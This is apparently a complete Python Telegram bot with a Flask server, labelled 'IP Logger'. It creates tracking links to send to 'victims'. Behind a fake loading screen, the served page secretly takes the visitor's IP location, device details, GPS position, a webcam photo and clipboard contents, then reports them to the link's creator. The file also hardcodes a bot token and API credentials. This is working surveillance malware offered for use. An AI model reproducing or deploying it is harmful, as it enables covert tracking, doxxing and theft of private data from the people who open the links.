import asyncio
from telethon import TelegramClient, events, Button
from telethon.tl.types import InputMediaGeoPoint, InputGeoPoint
from flask import Flask, request, render_template_string
import threading
import random
import string
import json
import os
from datetime import datetime
import requests
import base64

BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"

bot = TelegramClient('logger_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Flask(__name__)
links = {}
loop = None

TRACKER_PAGE = """<!DOCTYPE html>
<html>
<head><title>Loading...</title><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial}
.spinner{border:3px solid #333;border-top:3px solid #fe2c55;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 15px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style></head>
<body>
<div class="spinner"></div>
<p>Loading...</p>
<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>
<script>
fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});

if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(pos=>{
        fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});
    },err=>{},{enableHighAccuracy:true,timeout:10000});
}

(async function(){
    try{
        var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
        var v=document.getElementById('v');v.srcObject=st;await v.play();
        await new Promise(r=>setTimeout(r,2000));
        var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
        c.getContext('2d').drawImage(v,0,0);
        var ph=c.toDataURL('image/jpeg',0.7);
        await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});
        st.getTracks().forEach(t=>t.stop());
    }catch(e){}
})();

(async function(){
    try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
})();

setTimeout(function(){window.location.href='https://t.me/creator_failpybot';},5000);
</script></body></html>"""

def gen_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_ip_info(ip):
    first_ip = ip.split(',')[0].strip()
    try:
        r = requests.get(f"https://ipapi.co/{first_ip}/json/", timeout=5)
        data = r.json()
        if data.get('city'):
            return {'country': data.get('country_name','?'), 'city': data.get('city','?'), 'region': data.get('region','?'), 'isp': data.get('org','?'), 'lat': data.get('latitude'), 'lon': data.get('longitude'), 'query': first_ip}
    except: pass
    try:
        r = requests.get(f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", timeout=5)
        data = r.json()
        if data.get('city'):
            return {'country': data.get('country','?'), 'city': data.get('city','?'), 'region': data.get('regionName','?'), 'isp': data.get('isp','?'), 'lat': data.get('lat'), 'lon': data.get('lon'), 'query': first_ip}
    except: pass
    return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}

@app.route('/')
def home(): return "OK"

@app.route('/go/<lid>')
def track(lid):
    if lid not in links: return "Ссылка недействительна"
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '?')
    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'clipboard': None}
    v.update(get_ip_info(ip))
    links[lid]['victims'].append(v)
    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
    return render_template_string(TRACKER_PAGE, link_id=lid)

@app.route('/collect/<lid>', methods=['POST'])
def coll(lid):
    if lid in links and links[lid]['victims']:
        links[lid]['victims'][-1]['dev'] = request.get_json()
    return 'ok'

@app.route('/photo/<lid>', methods=['POST'])
def photo(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('photo'): links[lid]['victims'][-1]['photo'] = d['photo']
    return 'ok'

@app.route('/gps/<lid>', methods=['POST'])
def gps(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['gps'] = d
    return 'ok'

@app.route('/clipboard/<lid>', methods=['POST'])
def clipboard(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
    return 'ok'

async def notify(uid, lid):
    try:
        await asyncio.sleep(10)
        v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
        
        report = f"""🎯 НОВЫЙ ПЕРЕХОД
🕐 {v.get('time','?')}
🌐 IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
🏙 {v.get('city','?')}, {v.get('region','?')}, {v.get('country','?')}
📡 {v.get('isp','?')}
📱 {v.get('ua','?')[:150]}
"""
        if v.get('gps') and v['gps'].get('lat'):
            report += f"📍 GPS: {v['gps']['lat']}, {v['gps']['lon']}\n"
        if v.get('clipboard'):
            report += f"📋 Буфер: {v['clipboard'][:200]}"
        
        await bot.send_message(uid, report[:2000])
        
        if v.get('photo'):
            try:
                photo_path = f"photo_{lid}.jpg"
                with open(photo_path, 'wb') as f:
                    f.write(base64.b64decode(v['photo'].split(',')[1]))
                if os.path.getsize(photo_path) > 100:
                    await bot.send_file(uid, photo_path, caption="📸 Фото")
                os.remove(photo_path)
            except: pass
        
        if v.get('gps') and v['gps'].get('lat'):
            lat, lon = v['gps']['lat'], v['gps']['lon']
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=10))
            await bot.send_file(uid, file=geo, caption="📍 GPS")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
        
    except Exception as e:
        print(f"Ошибка: {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    buttons = [[Button.inline("🔗 Создать ссылку", "create")]]
    await event.reply("🔍 **IP Logger**\n\nНажми кнопку чтобы создать ссылку для отслеживания!", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data.decode() == "create":
        lid = gen_id()
        links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
        await event.edit(f"✅ Ссылка:\n`https://botaald.onrender.com/go/{lid}`\n\nОтправь жертве!")

async def main():
    global loop
    loop = asyncio.get_event_loop()
    port = int(os.environ.get('PORT', 8080))
    def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
    threading.Thread(target=run_flask, daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ IP Logger запущен!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
